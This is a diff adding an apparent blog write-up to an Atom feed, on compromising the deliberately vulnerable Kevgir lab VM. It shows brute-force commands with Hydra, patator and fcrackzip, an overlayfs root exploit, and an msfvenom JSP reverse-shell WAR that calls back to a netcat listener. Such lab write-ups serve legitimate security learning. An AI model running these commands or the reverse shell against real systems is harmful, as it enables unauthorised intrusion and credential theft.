@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-11-11T17:41:52-05:00</updated>
+  <updated>2017-12-30T06:11:29-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1021 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pwning Kevgir]]></title>
+    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
+    <updated>2017-12-02T14:08:05-05:00</updated>
+    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
+    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>
+
+<!-- more -->
+
+
+<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>
+
+<h2>Port 25 FTP bruteforce with Hydra</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+25/tcp    open  ftp         vsftpd 3.0.2
+|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
+</code></p>
+
+<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>
+
+<p>```
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt <a href="ftp://192.168.217.128:25">ftp://192.168.217.128:25</a>
+Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>
+
+<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-12-02 15:08:02
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
+[DATA] attacking <a href="ftp://192.168.217.128:25/">ftp://192.168.217.128:25/</a>
+[25][ftp] host: 192.168.217.128   login: admin   password: admin
+```</p>
+
+<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>
+
+<h2>Port 80 phpmyadmin bruteforce with patator</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Kevgir VM
+</code></p>
+
+<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="&lsquo;port 80&rsquo; &lsquo;port 80 apache&rsquo;" ></p>
+
+<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>
+
+<h3>patator</h3>
+
+<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>
+
+<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>
+
+<p>Let&rsquo;s see the available modules:</p>
+
+<p>```
+Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
+Usage: patator module &mdash;help</p>
+
+<p>Available modules:
+  + ftp_login     : Brute-force FTP
+  + ssh_login     : Brute-force SSH
+  + telnet_login  : Brute-force Telnet
+  + smtp_login    : Brute-force SMTP
+  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
+  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
+  + finger_lookup : Enumerate valid users using Finger
+  + http_fuzz     : Brute-force HTTP
+  + pop_login     : Brute-force POP3
+  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
+  + imap_login    : Brute-force IMAP4
+  + ldap_login    : Brute-force LDAP
+  + smb_login     : Brute-force SMB
+  + smb_lookupsid : Brute-force SMB SID-lookup
+  + rlogin_login  : Brute-force rlogin
+  + vmauthd_login : Brute-force VMware Authentication Daemon
+  + mssql_login   : Brute-force MSSQL
+  + oracle_login  : Brute-force Oracle
+  + mysql_login   : Brute-force MySQL
+  + mysql_query   : Brute-force MySQL queries
+  + pgsql_login   : Brute-force PostgreSQL
+  + vnc_login     : Brute-force VNC
+  + dns_forward   : Forward lookup names
+  + dns_reverse   : Reverse lookup subnets
+  + snmp_login    : Brute-force SNMP v1/2/3
+  + unzip_pass    : Brute-force the password of encrypted ZIP files
+  + keystore_pass : Brute-force the password of Java keystore files
+  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
+  + tcp_fuzz      : Fuzz TCP services
+  + dummy_test    : Testing module
+```</p>
+
+<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>
+
+<p><code>
+cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt
+</code></p>
+
+<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>
+
+<p>```
+patator http_fuzz &mdash;help
+Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
+Usage: http_fuzz &lt;module-options &hellip;> [global-options &hellip;]</p>
+
+<p>Examples:
+  http_fuzz url=<a href="http://10.0.0.1/FILE0">http://10.0.0.1/FILE0</a> 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
+  http_fuzz url=<a href="http://10.0.0.1/manager/html">http://10.0.0.1/manager/html</a> user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
+  http_fuzz url=<a href="http://10.0.0.1/phpmyadmin/index.php">http://10.0.0.1/phpmyadmin/index.php</a> method=POST body=&lsquo;pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en&rsquo; 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep=&lsquo;Cannot log in to the MySQL server&rsquo;</p>
+
+<p>Module options:
+  url           : target url (scheme://host[:port]/path?query)
+  body          : body data
+  header        : use custom headers
+  method        : method to use [GET | POST | HEAD | &hellip;]
+  auto_urlencode: automatically perform URL-encoding [1|0]
+  user_pass     : username and password for HTTP authentication (user:pass)
+  auth_type     : type of HTTP authentication [basic | digest | ntlm]
+  follow        : follow any Location redirect [0|1]
+  max_follow    : redirection limit [5]
+  accept_cookie : save received cookies to issue them in future requests [0|1]
+  http_proxy    : HTTP proxy to use (host:port)
+  ssl_cert      : client SSL certificate file (cert+key in PEM format)
+  timeout_tcp   : seconds to wait for a TCP handshake [10]
+  timeout       : seconds to wait for a HTTP response [20]
+  before_urls   : comma-separated URLs to query before the main request
+  before_egrep  : extract data from the before_urls response to place in the main request
+  after_urls    : comma-separated URLs to query after the main request
+  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
+  persistent    : use persistent connections [1|0]</p>
+
+<p>Global options:
+  &mdash;version            show program&rsquo;s version number and exit
+  -h, &mdash;help           show this help message and exit</p>
+
+<p>  Execution:</p>
+
+<pre><code>-x arg             actions and conditions, see Syntax below
+--start=N          start from offset N in the wordlist product
+--stop=N           stop at offset N
+--resume=r1[,rN]*  resume previous run
+-e arg             encode everything between two tags, see Syntax below
+-C str             delimiter string in combo files (default is ':')
+-X str             delimiter string in conditions (default is ',')
+</code></pre>
+
+<p>  Optimization:</p>
+
+<pre><code>--rate-limit=N     wait N seconds between tests (default is 0)
+--max-retries=N    skip payload after N failures (default is 4) (-1 for
+                   unlimited)
+-t N, --threads=N  number of threads (default is 10)
+</code></pre>
+
+<p>  Logging:</p>
+
+<pre><code>-l DIR             save output and response data into DIR
+-L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
+                   (DIR defaults to '/tmp/patator')
+</code></pre>
+
+<p>  Debugging:</p>
+
+<pre><code>-d, --debug        enable debug messages
+</code></pre>
+
+<p>Syntax:
+ -x actions:conditions</p>
+
+<pre><code>actions    := action[,action]*
+action     := "ignore" | "retry" | "free" | "quit" | "reset"
+conditions := condition=value[,condition=value]*
+condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
+
+ignore      : do not report
+retry       : try payload again
+free        : dismiss future similar payloads
+quit        : terminate execution now
+reset       : close current connection in order to reconnect next time
+
+code        : match status code
+size        : match size (N or N-M or N- or -N)
+time        : match time (N or N-M or N- or -N)
+mesg        : match message
+fgrep       : search for string in mesg
+egrep       : search for regex in mesg
+clen        : match Content-Length header (N or N-M or N- or -N)
+</code></pre>
+
+<p>For example, to ignore all redirects to the home page:
+&hellip; -x ignore:code=302,fgrep=&lsquo;Location: /home.html&rsquo;</p>
+
+<p> -e tag:encoding</p>
+
+<pre><code>tag        := any unique string (eg. T@G or _@@_ or ...)
+encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
+
+url         : url encode
+sha1        : hash in sha1
+md5         : hash in md5
+hex         : encode in hexadecimal
+b64         : encode in base64
+</code></pre>
+
+<p>For example, to encode every password in base64:
+&hellip; host=10.0.0.1 user=admin password=<em>@@</em>FILE0<em>@@</em> -e <em>@@</em>:b64</p>
+
+<p>Please read the README inside for more examples and usage information.
+```</p>
+
+<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>
+
+<p><code>
+http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
+</code></p>
+
+<p>And we have the password!</p>
+
+<p><code>
+patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
+17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
+17:17:27 patator    INFO -                                                                              
+17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+17:17:27 patator    INFO - -----------------------------------------------------------------------------
+17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
+17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
+17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
+</code></p>
+
+<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>
+
+<h2>Cracking ZIP archives</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      33719/tcp  mountd
+|   100005  1,2,3      41291/udp  mountd
+|   100021  1,3,4      47439/tcp  nlockmgr
+|   100021  1,3,4      60285/udp  nlockmgr
+|   100024  1          57769/udp  status
+|   100024  1          58840/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+2049/tcp  open  nfs_acl     2-3 (RPC #100227)
+47439/tcp open  nlockmgr    1-4 (RPC #100021)
+48137/tcp open  mountd      1-3 (RPC #100005)
+58840/tcp open  status      1 (RPC #100024)
+33719/tcp open  mountd      1-3 (RPC #100005)
+43866/tcp open  mountd      1-3 (RPC #100005)
+</code></p>
+
+<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>
+
+<p><code>
+showmount -e 192.168.217.128
+Export list for 192.168.217.128:
+/backup *
+</code></p>
+
+<p>I mounted it on my machine and found an archive:</p>
+
+<p><code>
+root@kali:/mnt# mkdir backup
+root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
+ls -la
+total 12760
+drwxr-xr-x 2 root root     4096 Feb 14  2016 .
+drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
+-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
+</code></p>
+
+<p>When I tried unzipping it, I got prompted for a password:</p>
+
+<p><code>
+unzip backup.tar.bz2.zip
+Archive:  backup.tar.bz2.zip
+[backup.tar.bz2.zip] backup.tar.bz2 password:
+</code></p>
+
+<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>
+
+<p>```
+fcrackzip &mdash;help</p>
+
+<p>fcrackzip version 1.0, a fast/free zip password cracker
+written by Marc Lehmann <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x70;&#99;&#103;&#64;&#103;&#111;&#x6f;&#102;&#x2e;&#x63;&#111;&#109;">&#112;&#99;&#x67;&#x40;&#103;&#111;&#x6f;&#x66;&#46;&#x63;&#111;&#109;</a> You can find more info on
+<a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>
+
+<p>USAGE: fcrackzip</p>
+
+<pre><code>      [-b|--brute-force]            use brute force algorithm
+      [-D|--dictionary]             use a dictionary
+      [-B|--benchmark]              execute a small benchmark
+      [-c|--charset characterset]   use characters from charset
+      [-h|--help]                   show this message
+      [--version]                   show the version of this program
+      [-V|--validate]               sanity-check the algortihm
+      [-v|--verbose]                be more verbose
+      [-p|--init-password string]   use string as initial password/file
+      [-l|--length min-max]         check password with length min to max
+      [-u|--use-unzip]              use unzip to weed out wrong passwords
+      [-m|--method num]             use method number "num" (see below)
+      [-2|--modulo r/m]             only calculcate 1/m of the password
+      file...                    the zipfiles to crack
+</code></pre>
+
+<p>methods compiled in (* = default):</p>
+
+<p> 0: cpmask
+ 1: zip1
+*2: zip2, USE_MULT_TAB
+```</p>
+
+<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>
+
+<p>```
+fcrackzip -b -u -v backup.tar.bz2.zip
+found file &lsquo;backup.tar.bz2&rsquo;, (size cp/uc 13057834/13076586, flags 9, chk 28e3)</p>
+
+<p>PASSWORD FOUND!!!!: pw == aaaaaa
+```</p>
+
+<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>
+
+<p><code>
+ls
+dvwa  gentleman  index.html  web-standards  zenphoto
+</code></p>
+
+<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>
+
+<h2>Samba</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+Host script results:
+|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 4.1.6-Ubuntu)
+|   Computer name: canyoupwnme
+|   NetBIOS computer name: CANYOUPWNME\x00
+|   Domain name:
+|   FQDN: canyoupwnme
+|_  System time: 2017-12-02T21:15:36+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2017-12-02 14:15:37
+|_  start_date: 1600-12-31 19:03:58
+</code></p>
+
+<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>
+
+<h2>SSH &ndash; privilege escalation</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
+|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
+|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
+|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
+</code></p>
+
+<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>
+
+<p><code>
+cat /etc/issue
+Ubuntu 14.04.3 LTS \n \l
+</code></p>
+
+<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>
+
+<p><code>
+admin@canyoupwnme:~$ ./overlayfs
+root@canyoupwnme:~# id
+uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
+root@canyoupwnme:~# whoami
+root
+</code></p>
+
+<h2>Redis</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+6379/tcp  open  redis       Redis key-value store 3.0.7
+</code></p>
+
+<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>
+
+<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
+broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
+hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
+eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
+Sentinel and automatic partitioning with Redis Cluster</p></blockquote>
+
+<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>
+
+<p>```
+redis-cli -h
+redis-cli 4.0.2</p>
+
+<p>Usage: redis-cli [OPTIONS] [cmd [arg [arg &hellip;]]]
+  -h <hostname>      Server hostname (default: 127.0.0.1).
+  -p <port>          Server port (default: 6379).
+  -s <socket>        Server socket (overrides hostname and port).
+  -a <password>      Password to use when connecting to the server.
+  -r <repeat>        Execute specified command N times.
+  -i <interval>      When -r is used, waits <interval> seconds per command.</p>
+
+<pre><code>                 It is possible to specify sub-second times like -i 0.1.
+</code></pre>
+
+<p>  -n <db>            Database number.
+  -x                 Read last argument from STDIN.
+  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
+  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
+  &mdash;raw              Use raw formatting for replies (default when STDOUT is</p>
+
+<pre><code>                 not a tty).
+</code></pre>
+
+<p>  &mdash;no-raw           Force formatted output even when STDOUT is not a tty.
+  &mdash;csv              Output in CSV format.
+  &mdash;stat             Print rolling stats about server: mem, clients, &hellip;
+  &mdash;latency          Enter a special mode continuously sampling latency.</p>
+
+<pre><code>                 If you use this mode in an interactive session it runs
+                 forever displaying real-time stats. Otherwise if --raw or
+                 --csv is specified, or if you redirect the output to a non
+                 TTY, it samples the latency for 1 second (you can use
+                 -i to change the interval), then produces a single output
+                 and exits.
+</code></pre>
+
+<p>  &mdash;latency-history  Like &mdash;latency but tracking latency changes over time.</p>
+
+<pre><code>                 Default time interval is 15 sec. Change it using -i.
+</code></pre>
+
+<p>  &mdash;latency-dist     Shows latency as a spectrum, requires xterm 256 colors.</p>
+
+<pre><code>                 Default time interval is 1 sec. Change it using -i.
+</code></pre>
+
+<p>  &mdash;lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
+  &mdash;slave            Simulate a slave showing commands received from the master.
+  &mdash;rdb <filename>   Transfer an RDB dump from remote server to local file.
+  &mdash;pipe             Transfer raw Redis protocol from stdin to server.
+  &mdash;pipe-timeout <n> In &mdash;pipe mode, abort with error if after sending all data.</p>
+
+<pre><code>                 no reply is received within &lt;n&gt; seconds.
+                 Default timeout: 30. Use 0 to wait forever.
+</code></pre>
+
+<p>  &mdash;bigkeys          Sample Redis keys looking for big keys.
+  &mdash;scan             List all keys using the SCAN command.
+  &mdash;pattern <pat>    Useful with &mdash;scan to specify a SCAN pattern.
+  &mdash;intrinsic-latency <sec> Run a test to measure intrinsic system latency.</p>
+
+<pre><code>                 The test will run for the specified amount of seconds.
+</code></pre>
+
+<p>  &mdash;eval <file>      Send an EVAL command using the Lua script at <file>.
+  &mdash;ldb              Used with &mdash;eval enable the Redis Lua debugger.
+  &mdash;ldb-sync-mode    Like &mdash;ldb but uses the synchronous Lua debugger, in</p>
+
+<pre><code>                 this mode the server is blocked and script changes are
+                 are not rolled back from the server memory.
+</code></pre>
+
+<p>  &mdash;help             Output this help and exit.
+  &mdash;version          Output version and exit.</p>
+
+<p>Examples:
+  cat /etc/passwd | redis-cli -x set mypasswd
+  redis-cli get mypasswd
+  redis-cli -r 100 lpush mylist x
+  redis-cli -r 100 -i 1 info | grep used_memory_human:
+  redis-cli &mdash;eval myscript.lua key1 key2 , arg1 arg2 arg3
+  redis-cli &mdash;scan &mdash;pattern &lsquo;<em>:12345</em>&rsquo;</p>
+
+<p>  (Note: when using &mdash;eval the comma separates KEYS[] from ARGV[] items)</p>
+
+<p>When no command is given, redis-cli starts in interactive mode.
+Type &ldquo;help&rdquo; in interactive mode for information on available commands
+and settings.
+```</p>
+
+<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>
+
+<p>```
+redis-cli -h 192.168.217.128
+192.168.217.128:6379> help
+redis-cli 4.0.2
+To get help about Redis commands type:</p>
+
+<pre><code>  "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
+  "help &lt;command&gt;" for help on &lt;command&gt;
+  "help &lt;tab&gt;" to get a list of possible help topics
+  "quit" to exit
+</code></pre>
+
+<p>To set redis-cli preferences:</p>
+
+<pre><code>  ":set hints" enable online hints
+  ":set nohints" disable online hints
+</code></pre>
+
+<p>Set your preferences in ~/.redisclirc
+192.168.217.128:6379> info</p>
+
+<h1>Server</h1>
+
+<p>redis_version:3.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:aa70bcb321ba8313
+redis_mode:standalone
+os:Linux 3.19.0-25-generic i686
+arch_bits:32
+multiplexing_api:epoll
+gcc_version:4.8.4
+process_id:1263
+run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
+tcp_port:6379
+uptime_in_seconds:3235
+uptime_in_days:0
+hz:10
+lru_clock:2368010
+config_file:/etc/redis/6379.conf</p>
+
+<h1>Clients</h1>
+
+<p>connected_clients:1
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0</p>
+
+<h1>Memory</h1>
+
+<p>used_memory:637624
+used_memory_human:622.68K
+used_memory_rss:8929280
+used_memory_peak:637624
+used_memory_peak_human:622.68K
+used_memory_lua:24576
+mem_fragmentation_ratio:14.00
+mem_allocator:jemalloc-3.6.0</p>
+
+<h1>Persistence</h1>
+
+<p>loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1512314215
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok</p>
+
+<h1>Stats</h1>
+
+<p>total_connections_received:2
+total_commands_processed:2
+instantaneous_ops_per_sec:0
+total_net_input_bytes:41
+total_net_output_bytes:6067614
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0</p>
+
+<h1>Replication</h1>
+
+<p>role:master
+connected_slaves:0
+master_repl_offset:0
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0</p>
+
+<h1>CPU</h1>
+
+<p>used_cpu_sys:3.71
+used_cpu_user:1.60
+used_cpu_sys_children:0.00
+used_cpu_user_children:0.00</p>
+
+<h1>Cluster</h1>
+
+<p>cluster_enabled:0</p>
+
+<h1>Keyspace</h1>
+
+<p>192.168.217.128:6379>
+```</p>
+
+<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>
+
+<h2>Tomcat default credentials</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+</code></p>
+
+<p>Time to look at that Tomcat server!</p>
+
+<p>```
+nikto -h <a href="http://192.168.217.128:8080/">http://192.168.217.128:8080/</a></p>
+
+<h2>&ndash; Nikto v2.1.6</h2>
+
+<ul>
+<li>Target IP:          192.168.217.128</li>
+<li>Target Hostname:    192.168.217.128</li>
+<li>Target Port:        8080
+
+<ul>
+<li>Start Time:         2017-12-03 12:21:45 (GMT-5)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>Server: Apache-Coyote/1.1</li>
+<li>Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000</li>
+<li>The anti-clickjacking X-Frame-Options header is not present.</li>
+<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
+<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
+<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
+<li>Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</li>
+<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
+<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
+<li>/: Appears to be a default Apache Tomcat install.</li>
+<li>/examples/servlets/index.html: Apache Tomcat default JSP pages present.</li>
+<li>OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</li>
+<li>Default account found for &lsquo;Tomcat Manager Application&rsquo; at /manager/html (ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;). Apache Tomcat.</li>
+<li>/manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
+<li>/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
+<li>/manager/status: Tomcat Server Status interface found (pass protected)</li>
+<li>7661 requests: 0 error(s) and 14 item(s) reported on remote host
+
+<ul>
+<li>End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>1 host(s) tested
+```</li>
+</ul>
+
+
+<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>
+
+<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="&lsquo;manager&rsquo; &lsquo;tomcat web application manager&rsquo;" ></p>
+
+<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>
+
+<p><code>
+msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
+Payload size: 1099 bytes
+Final size of war file: 1099 bytes
+Saved as: runme.war
+</code></p>
+
+<p>Check what&rsquo;s inside:</p>
+
+<p><code>
+jar -tf runme.war
+WEB-INF/
+WEB-INF/web.xml
+kndeoavjwgjs.jsp
+</code></p>
+
+<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>
+
+<p><code>
+nc -vnlp 8888
+listening on [any] 8888 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
+whoami
+tomcat7
+</code></p>
+
+<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>
+
+<h2>Joomla</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: Joomla! 1.5 - Open Source Content Management
+| http-robots.txt: 14 disallowed entries
+| /administrator/ /cache/ /components/ /images/
+| /includes/ /installation/ /language/ /libraries/ /media/
+|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Welcome to the Frontpage
+</code></p>
+
+<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>
+
+<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>
+
+<p>```
+* The Exact version found is 1.5.1</p>
+
+<h1>15</h1>
+
+<p>Info &ndash;> CoreComponent: Joomla Remote Admin Password Change Vulnerability
+Versions Affected: 1.5.5 &lt;=
+Check: /components/com_user/controller.php
